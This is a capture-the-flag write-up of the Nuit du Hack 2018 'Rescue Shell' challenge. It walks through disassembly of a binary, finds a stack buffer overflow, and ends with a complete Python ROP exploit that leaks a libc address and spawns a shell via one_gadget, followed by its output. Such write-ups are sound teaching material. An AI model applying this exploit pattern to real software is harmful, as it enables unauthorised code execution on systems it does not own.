# Reference

[//]: <> (文章所涉及到的技术点、WriteUp的链接)

https://github.com/p4-team/ctf/tree/master/2018-03-30-nuit-du-hack/rescue-shell

https://ark444.github.io/posts/NDH2k18_rescue_shell_writeup

https://advancedpersistentjest.com/2018/04/01/writeups-so_stealthy-rescue-shell-nuit-du-hack-quals/


# Title

[//]: <> (题目)

Rescue Shell, 100p, exploit
In this task we were given a binary showing a password prompt. There was a simple buffer overflow, allowing us to ROP and first dump GOT fread address, then overwrite it with libc single gadget offset.

# Content

[//]: <> (WriteUp内容)

Rescue shell was 100 points exploit at NDH quals. We were given a binary named rescue and the libc it uses libc.so.6.

And a service runs at rescueshell.challs.malice.fr on port 6060

## Analysis
What I like to do in the first place is to take a quick look at the real target, the one running on the server.
```
$ nc rescueshell.challs.malice.fr 6060
RescueShell 0.4
=================

Welcome anonymous ! This shell is restricted, please log in.

Password:
```
Okay, it is asking for a password. If we input something it asks for the password again. Now, what if we input something really long? Well. It seems to break. Let’s see what securities are implemented into the binary, using checksec:
```
$ checksec -f rescue 
```
|RELRO|STACK CANARY|NX|PIE|RPATH|RUNPATH|FORTIFYFortified|Fortifiable|FILE|
|-|-|-|-|-|-|-|-|-|
No RELRO|No canary found|NX enabled|No PIE|No RPATH|No RUNPATH|No|06|rescue

Now that’s done, time to read some assembly to understand how it works.

Disassembling using radare2

I’m not really a radare2 user yet, but I’m trying to learn how to use it on a daily basis, so if you have any recommendations or advices, I’m taking them!

```
$ r2 rescue
 -- EXPLICIT CONTENT
[0x00400660]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[0x00400660]> afl
0x00400580    3 26           sym._init
0x004005b0    1 6            sym.imp.strncmp
0x004005c0    1 6            sym.imp.fread
0x004005d0    1 6            sym.imp.write
0x004005e0    1 6            sym.imp.fclose
0x004005f0    1 6            sym.imp.strlen
0x00400600    1 6            sym.imp.read
0x00400610    1 6            sym.imp.__libc_start_main
0x00400620    1 6            loc.imp.__gmon_start
0x00400630    1 6            sym.imp.memcpy
0x00400640    1 6            sym.imp.fopen
0x00400650    1 6            sym.imp.exit
0x00400660    1 41           entry0
0x00400690    4 50   -> 41   sym.deregister_tm_clones
0x004006d0    3 53           sym.register_tm_clones
0x00400710    3 28           sym.__do_global_dtors_aux
0x00400730    4 38   -> 35   entry1.init
0x00400756    1 80           sym.check_passphrase
0x004007a6    1 129          sym.admin_shell
0x00400827    3 91           sym.read_password_file
0x00400882    3 419          sym.main
0x00400a30    4 101          sym.__libc_csu_init
0x00400aa0    1 2            sym.__libc_csu_fini
0x00400aa4    1 9            sym._fini
[0x00400660]>
```

We quickly notice some functions that looks interesting:
* sym.check_passphrase
* sym.admin_shell
* sym.read_password_file
* sym.main

My first few guesses are: there is a password file that contains the password to launch the admin shell. If we leak the password, we should be able to run the shell. That’s a 100 point exploit after all, shouldn’t be hard.

Okay, let’s disassemble the main function to see where the crash happens:
```
[0x00400660]> pdf @ main
            ;-- main:
/ (fcn) sym.main 419
|   sym.main ();
|           ; var int local_160h @ rbp-0x160
|           ; var int local_154h @ rbp-0x154
|           ; var int local_150h @ rbp-0x150
|           ; var int local_148h @ rbp-0x148
|           ; var int local_146h @ rbp-0x146
|           ; var int local_140h @ rbp-0x140
|           ; var int local_138h @ rbp-0x138
|           ; var int local_130h @ rbp-0x130
|           ; var int local_128h @ rbp-0x128
|           ; var int local_120h @ rbp-0x120
|           ; var int local_118h @ rbp-0x118
|           ; var int local_110h @ rbp-0x110
|           ; var int local_108h @ rbp-0x108
|           ; var int local_100h @ rbp-0x100
|           ; var int local_f8h @ rbp-0xf8
|           ; var int local_f0h @ rbp-0xf0
|           ; var int local_e8h @ rbp-0xe8
|           ; var int local_e0h @ rbp-0xe0
|           ; var int local_d0h @ rbp-0xd0
|           ; var int local_8h @ rbp-0x8
|           ; DATA XREF from 0x0040067d (entry0)
|           0x00400882      55             push rbp
|           0x00400883      4889e5         mov rbp, rsp
|           0x00400886      4881ec600100.  sub rsp, 0x160
|           0x0040088d      89bdacfeffff   mov dword [local_154h], edi
|           0x00400893      4889b5a0feff.  mov qword [local_160h], rsi
|           0x0040089a      48b852657363.  movabs rax, 0x6853657563736552
|           0x004008a4      488985c0feff.  mov qword [local_140h], rax
|           0x004008ab      48b8656c6c20.  movabs rax, 0xa342e30206c6c65
|           0x004008b5      488985c8feff.  mov qword [local_138h], rax
|           0x004008bc      48b83d3d3d3d.  movabs rax, 0x3d3d3d3d3d3d3d3d
|           0x004008c6      488985d0feff.  mov qword [local_130h], rax
|           0x004008cd      48b83d3d3d3d.  movabs rax, 0x3d3d3d3d3d3d3d3d
|           0x004008d7      488985d8feff.  mov qword [local_128h], rax
|           0x004008de      48b83d0a0a57.  movabs rax, 0x6f636c65570a0a3d
|           0x004008e8      488985e0feff.  mov qword [local_120h], rax
|           0x004008ef      48b86d652061.  movabs rax, 0x796e6f6e6120656d
|           0x004008f9      488985e8feff.  mov qword [local_118h], rax
|           0x00400900      48b86d6f7573.  movabs rax, 0x5420212073756f6d
|           0x0040090a      488985f0feff.  mov qword [local_110h], rax
|           0x00400911      48b868697320.  movabs rax, 0x6c65687320736968
|           0x0040091b      488985f8feff.  mov qword [local_108h], rax
|           0x00400922      48b86c206973.  movabs rax, 0x736572207369206c
|           0x0040092c      48898500ffff.  mov qword [local_100h], rax
|           0x00400933      48b874726963.  movabs rax, 0x2c64657463697274
|           0x0040093d      48898508ffff.  mov qword [local_f8h], rax
|           0x00400944      48b820706c65.  movabs rax, 0x20657361656c7020
|           0x0040094e      48898510ffff.  mov qword [local_f0h], rax
|           0x00400955      48b86c6f6720.  movabs rax, 0xa2e6e6920676f6c
|           0x0040095f      48898518ffff.  mov qword [local_e8h], rax
|           0x00400966      66c78520ffff.  mov word [local_e0h], 0xa
|           0x0040096f      48b850617373.  movabs rax, 0x64726f7773736150
|           0x00400979      488985b0feff.  mov qword [local_150h], rax
|           0x00400980      66c785b8feff.  mov word [local_148h], 0x203a
|           0x00400989      c685bafeffff.  mov byte [local_146h], 0
|           0x00400990      bfb60a4000     mov edi, str.._password.txt ; 0x400ab6 ; "./password.txt"
|           0x00400995      e88dfeffff     call sym.read_password_file
|           0x0040099a      488d85c0feff.  lea rax, [local_140h]
|           0x004009a1      4889c7         mov rdi, rax                ; const char * s
|           0x004009a4      e847fcffff     call sym.imp.strlen         ; size_t strlen(const char *s)
|           0x004009a9      4889c2         mov rdx, rax                ; size_t nbytes
|           0x004009ac      488d85c0feff.  lea rax, [local_140h]
|           0x004009b3      4889c6         mov rsi, rax                ; void *ptr
|           0x004009b6      bf01000000     mov edi, 1                  ; int fd
|           0x004009bb      e810fcffff     call sym.imp.write          ; ssize_t write(int fd, void *ptr, size_t nbytes)
|           ; JMP XREF from 0x00400a1c (sym.main)
|       .-> 0x004009c0      488d85b0feff.  lea rax, [local_150h]
|       :   0x004009c7      4889c7         mov rdi, rax                ; const char * s
|       :   0x004009ca      e821fcffff     call sym.imp.strlen         ; size_t strlen(const char *s)
|       :   0x004009cf      4889c2         mov rdx, rax                ; size_t nbytes
|       :   0x004009d2      488d85b0feff.  lea rax, [local_150h]
|       :   0x004009d9      4889c6         mov rsi, rax                ; void *ptr
|       :   0x004009dc      bf01000000     mov edi, 1                  ; int fd
|       :   0x004009e1      e8eafbffff     call sym.imp.write          ; ssize_t write(int fd, void *ptr, size_t nbytes)
|       :   0x004009e6      488d8530ffff.  lea rax, [local_d0h]
|       :   0x004009ed      bac8000000     mov edx, 0xc8               ; 200 ; size_t nbyte
|       :   0x004009f2      4889c6         mov rsi, rax                ; void *buf
|       :   0x004009f5      bf00000000     mov edi, 0                  ; int fildes
|       :   0x004009fa      e801fcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|       :   0x004009ff      488945f8       mov qword [local_8h], rax
|       :   0x00400a03      488b45f8       mov rax, qword [local_8h]
|       :   0x00400a07      89c2           mov edx, eax
|       :   0x00400a09      488d8530ffff.  lea rax, [local_d0h]
|       :   0x00400a10      89d6           mov esi, edx
|       :   0x00400a12      4889c7         mov rdi, rax
|       :   0x00400a15      e83cfdffff     call sym.check_passphrase
|       :   0x00400a1a      85c0           test eax, eax
|       `=< 0x00400a1c      74a2           je 0x4009c0
|           0x00400a1e      b800000000     mov eax, 0
|           0x00400a23      c9             leave
\           0x00400a24      c3             ret
[0x00400660]>
```

In short:

* call sym.read_password_file
* Display welcome message
    * Start loop:
    * Print “Password: “
    * call read
    * check passphrase
    * end loop if passphrase is good.
We notice that the function sym.admin_shell is not called at all, maybe the goal is to jump to it from the crash.

Other important things to notice:

* read is called with a read size of 0xc8
* Given the stack size and the used space in it, the crash does not seem to appear here.
* The only function called after the read is sym.check_passphrase.

Let’s take a look at sym.check_passphrase:
```
[0x00400660]> pdf @ sym.check_passphrase
/ (fcn) sym.check_passphrase 80
|   sym.check_passphrase ();
|           ; var int local_4ch @ rbp-0x4c
|           ; var int local_48h @ rbp-0x48
|           ; var int local_40h @ rbp-0x40
|           ; CALL XREF from 0x00400a15 (sym.main)
|           0x00400756      55             push rbp
|           0x00400757      4889e5         mov rbp, rsp
|           0x0040075a      4883ec50       sub rsp, 0x50               ; 'P'
|           0x0040075e      48897db8       mov qword [local_48h], rdi
|           0x00400762      8975b4         mov dword [local_4ch], esi
|           0x00400765      8b45b4         mov eax, dword [local_4ch]
|           0x00400768      4863d0         movsxd rdx, eax             ; size_t n
|           0x0040076b      488b4db8       mov rcx, qword [local_48h]
|           0x0040076f      488d45c0       lea rax, [local_40h]
|           0x00400773      4889ce         mov rsi, rcx                ; const void *s2
|           0x00400776      4889c7         mov rdi, rax                ; void *s1
|           0x00400779      e8b2feffff     call sym.imp.memcpy         ; void *memcpy(void *s1, const void *s2, size_t n)
|           0x0040077e      bfc0126000     mov edi, obj.admin_password ; rsi ; 0x6012c0 ; const char * s
|           0x00400783      e868feffff     call sym.imp.strlen         ; size_t strlen(const char *s)
|           0x00400788      4889c2         mov rdx, rax                ; size_t n
|           0x0040078b      488d45c0       lea rax, [local_40h]
|           0x0040078f      bec0126000     mov esi, obj.admin_password ; rsi ; 0x6012c0 ; const char * s2
|           0x00400794      4889c7         mov rdi, rax                ; const char * s1
|           0x00400797      e814feffff     call sym.imp.strncmp        ; int strncmp(const char *s1, const char *s2, size_t n)
|           0x0040079c      85c0           test eax, eax
|           0x0040079e      0f94c0         sete al
|           0x004007a1      0fb6c0         movzx eax, al
|           0x004007a4      c9             leave
\           0x004007a5      c3             ret
[0x00400660]>
```

From the main we can see it is called using our input and the size of bytes read. More interestingly, there is a call to memcpy using these values. However, the stack is allocated by 0x50, which is smaller than the 0xc8 maximum read size allowed in the main.

We thus have a buffer overflow on the check_passphrase function!

One final interesting thing to look at is the sym.admin_shell function to see how we can get a shell from it. Unfortunately, it happens that this function is a fake and prints a message stating it is disabled.

## Exploitation
### Summary and action plan.

What we have so far:

* buffer overflow on sym.check_passphrase
* no function to spawn a shell
* the libc.so.6 file that the binary uses
* no canary
* NX bit enabled

Fair enough! The plan is:

1 Overwrite RIP to get control over the execution flow 2 LEAK the address of a function 3 Calculate offset difference between this function and one_gadget 4 Survive leak and execute one_gadget 5 ??? 6 profit!

### RIP overwriting

For this step, I used gdb along with wapiflapi’s gxf extension.
```
$ gdb ./rescue 
Reading symbols from rescue...(no debugging symbols found)...done.
(gdb) gx cyclic 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac
(gdb) r
Starting program: /home/ark/security/challz/NDH2k18_quals/rescue_shell/rescue 
RescueShell 0.4
=================

Welcome anonymous ! This shell is restricted, please log in.

Password: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007a5 in check_passphrase ()
-----------------------------------registers------------------------------------
rax : 0
rbx : 0
rcx : 99 'c'
rdx : 0
rsi : 0x6012c0 : 'changeme203\n'
rdi : 0x7fffffffda30 : 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama' + ...
rbp : 'qaaaraaa' (0x6161617261616171)
rsp : 0x7fffffffda78 : 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa' + ...
r8  : 0
r9  : 119 'w'
r10 : 180
r11 : 12
r12 : 0x400660 <_start+0>:	xor    ebp,ebp
r13 : 0x7fffffffdcc0 : 1
r14 : 0
r15 : 0
rip : 0x4007a5 <check_passphrase+79>:	ret    
--------------------------------------code--------------------------------------
   0x000000000040079e <check_passphrase+72>:	sete   al
   0x00000000004007a1 <check_passphrase+75>:	movzx  eax,al
   0x00000000004007a4 <check_passphrase+78>:	leave  
=> 0x00000000004007a5 <check_passphrase+79>:	ret    
-------------------------------------stack--------------------------------------
 0 0x7fffffffda78 : 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa' + ...
 8 0x7fffffffda80 : 'uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha' + ...
16 0x7fffffffda88 : 'waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabja' + ...
24 0x7fffffffda90 : 'yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabla' + ...
32 0x7fffffffda98 : 'baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabna' + ...
40 0x7fffffffdaa0 : 'daabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpa' + ...
48 0x7fffffffdaa8 : 'faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra' + ...
56 0x7fffffffdab0 : 'haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta' + ...
-------------------------------------frame--------------------------------------
#0  0x00000000004007a5 in check_passphrase ()
(gdb) gx cyclic -s qaaaraaa
64
```

We can conclude from this that we overwrite RBP after 64 bytes. RIP will be overwriten shortly after, at 72 bytes.

### LEAK a function’s address

Now that we know how to gain control of the execution flow, we’ll have to leak a function’s address. To do so, we need a primitive that will display the memory for us and allow us to keep control afterward.

The main function is perfect for this purpose:
```
|       :   0x004009ca      e821fcffff     call sym.imp.strlen         ; size_t strlen(const char *s)
|       :   0x004009cf      4889c2         mov rdx, rax                ; size_t nbytes
|       :   0x004009d2      488d85b0feff.  lea rax, [local_150h]
|       :   0x004009d9      4889c6         mov rsi, rax                ; void *ptr
|       :   0x004009dc      bf01000000     mov edi, 1                  ; int fd
|       :   0x004009e1      e8eafbffff     call sym.imp.write          ; ssize_t write(int fd, void *ptr, size_t nbytes)
|       :   0x004009e6      488d8530ffff.  lea rax, [local_d0h]
|       :   0x004009ed      bac8000000     mov edx, 0xc8               ; 200 ; size_t nbyte
|       :   0x004009f2      4889c6         mov rsi, rax                ; void *buf
|       :   0x004009f5      bf00000000     mov edi, 0                  ; int fildes
|       :   0x004009fa      e801fcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
```
I chose to use fclose’s address for the leak. A few remark before we leak that address:

* strlen will stop at \x00, and we need at least 8 bytes being printed to be sure we did not miss one.
* We need to put the parameter for strlen in the RDI register.
* write uses local_150h for second parameter which is rbp-0x150.

### Finding a 8 byte long string null terminated
Well that’s kinda easy, the program opens a file called “password.txt”, which is 14 bytes long, 14 - 8 is 6, the string is located at 0x400ab6. Add 6, that’s 0x400abc.

### Finding a gadget to put that previously calculated address into ```RDI```
For this task, I used the tool ropper:
```
$ ropper -f rescue --search 'pop rdi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: rescue
0x0000000000400a93: pop rdi; ret;
```

### Putting fclose’s address into the buffer for write

We said that write uses rbp-0x150 as second parameter. We control RBP from our buffer overflow, we just have to put the address of fclose on the .got + 0x150.

I got the offset of flcose on the .got using objdump:
```
00000000004005e0 <fclose@plt>:
  4005e0: ff 25 3a 0c 20 00  jmp QWORD PTR [rip+0x200c3a]   #   601220 <fclose@GLIBC_2.2.5>
```

We’ll use the address: 0x601220+0x150.

That’s our first stage done.

### Calculate offset difference between fclose and one_gadget.

Getting fclose offset in libc.so.6

Easy enough:
```
$ gdb libc.so.6
Reading symbols from libc.so.6...(no debugging symbols found)...done.
(gdb) p fclose
$1 = {<text variable, no debug info>} 0x695e0 <fclose>
```

Getting one_gadget offset

One_gadget is the one gadget you can find in the libc that performs the simple and wonderful task of ```execve("/bin/sh", rsp+0x30, environ)```

There is a useful tool on github that allows to search for it easily.

Using it is fairly simple:

```
$ one_gadget libc.so.6 
0x41320	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x41374	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xd6e77	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

There are three of them, it doesn’t really matter which one to choose, let’s go with the first one.

### Compute offset difference:
Simple substraction: ```0x695e0-0x41320 = 0x282c0```

### Survive the leak and execute one_gadget

Don’t choose your gadgets at random! ;) There was a lot of strlen/write in the code that we could have used to leak fclose’s address, however the one I chose was great because the code continues and goes through our read and ```sym.check_passphrase``` again!

Which means that we can trigger the buffer overflow a second time, allowing us to write the computed address: ```fclose_leak_addr - offset_difference```.

### Putting it all together: final exploit.

```
import binexpect
import struct

if __name__=='__main__':


    setup = binexpect.setup('nc rescueshell.challs.malice.fr 6060')
    target = setup.target()
    target.setecho(False)

    pop_rdi_ret         = 0x400a93
    slen_write          = 0x4009ca
    fclose_got          = 0x601220

    offset_one_gadget   = 0x41320
    offset_fclose       = 0x695e0
    diff_offset         = offset_fclose - offset_one_gadget

    payload  = b'A' * 64                                    ## fill buffer
    payload += struct.pack('Q', fclose_got+0x150)           ## ADDR used for write
    payload += struct.pack('Q', pop_rdi_ret)                ## POP addr to leak
    payload += struct.pack('Q', 0x400abc)                   ## 8 bytes + '\x00'
    payload += struct.pack('Q', slen_write)                 ## STRLEN / WRITE / READ

    target.tryexpect('Password: ')
    target.sendbin(payload)
    target.sendeof()
    target.flush()

    target.tryexpect(b'.*\x7f')
    raw = target.after[-6:]
    leak = struct.unpack('Q', raw.ljust(8, b'\x00'))[0]     ## LEAK fclose addr
    print('[+] Leaked fread addr: %s' % hex(leak))

    one_gadget = leak - diff_offset                           ## Calculate real addr for sh
    print('[+] one_gadget should be at: %s' % hex(one_gadget))

    payload  = b'B' * 64
    payload += struct.pack('Q', 0x42424242)                 ## RBP on .got
    payload += struct.pack('Q', one_gadget)                 ## one_gadget

    target.sendbin(payload)
    target.sendeof()

    target.pwned()
```

Binexpect is a module that wraps pexpect that you can find on github

### Profit

```
$ python sploit.py 
[+] Leaked fread addr: 0x7fc3150775e0
[+] one_gadget should be at: 0x7fc31504f320

      ▄▄▄·▄▄▌ ▐ ▄▌ ▐ ▄ ▄▄▄ .·▄▄▄▄      ▄• ▄▌.▄▄ · ▪   ▐ ▄  ▄▄ •
     ▐█ ▄███· █▌▐█•█▌▐█▀▄.▀·██▪ ██     █▪██▌▐█ ▀. ██ •█▌▐█▐█ ▀ ▪
      ██▀·██▪▐█▐▐▌▐█▐▐▌▐▀▀▪▄▐█· ▐█▌    █▌▐█▌▄▀▀▀█▄▐█·▐█▐▐▌▄█ ▀█▄
     ▐█▪·•▐█▌██▐█▌██▐█▌▐█▄▄▌██. ██     ▐█▄█▌▐█▄▪▐█▐█▌██▐█▌▐█▄▪▐█
     .▀    ▀▀▀▀ ▀▪▀▀ █▪ ▀▀▀ ▀▀▀▀▀•      ▀▀▀  ▀▀▀▀ ▀▀▀▀▀ █▪·▀▀▀▀
 ▄▄▄▄    ██▓ ███▄    █ ▓█████ ▒██   ██▒ ██▓███  ▓█████  ▄████▄  ▄▄▄█████▓
▓█████▄ ▓██▒ ██ ▀█   █ ▓█   ▀ ▒▒ █ █ ▒░▓██░  ██▒▓█   ▀ ▒██▀ ▀█  ▓  ██▒ ▓▒
▒██▒ ▄██▒██▒▓██  ▀█ ██▒▒███   ░░  █   ░▓██░ ██▓▒▒███   ▒▓█    ▄ ▒ ▓██░ ▒░
▒██░█▀  ░██░▓██▒  ▐▌██▒▒▓█  ▄  ░ █ █ ▒ ▒██▄█▓▒ ▒▒▓█  ▄ ▒▓▓▄ ▄██▒░ ▓██▓ ░
░▓█  ▀█▓░██░▒██░   ▓██░░▒████▒▒██▒ ▒██▒▒██▒ ░  ░░▒████▒▒ ▓███▀ ░  ▒██▒ ░
░▒▓███▀▒░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░▒▓▒░ ░  ░░░ ▒░ ░░ ░▒ ▒  ░  ▒ ░░
▒░▒   ░  ▒ ░░ ░░   ░ ▒░ ░ ░  ░░░   ░▒ ░░▒ ░      ░ ░  ░  ░  ▒       ░
 ░    ░  ▒ ░   ░   ░ ░    ░    ░    ░  ░░          ░   ░          ░
 ░       ░           ░    ░  ░ ░    ░              ░  ░░ ░ @wapiflapi
------░------------------------------------------------░-----------------
- Powered by pexpect, works best with linux and gxf -
-------------------------------------------------------------------------
Escape character is '^]'
ls
flag.txt
password.txt
rescue
cat flag.txt
NDH{wilFupsdrossyerIvid}
```

### Conclusion

Classiq but fun challenge, I expected it to be a bit easier since it was only worth 100 points, but after all, we are here to improve our skills and not just win points. So that means that I’m not good enough in exploitation and need to work more on this!

Hope you enjoyed this post, see y’all in another article!

ark.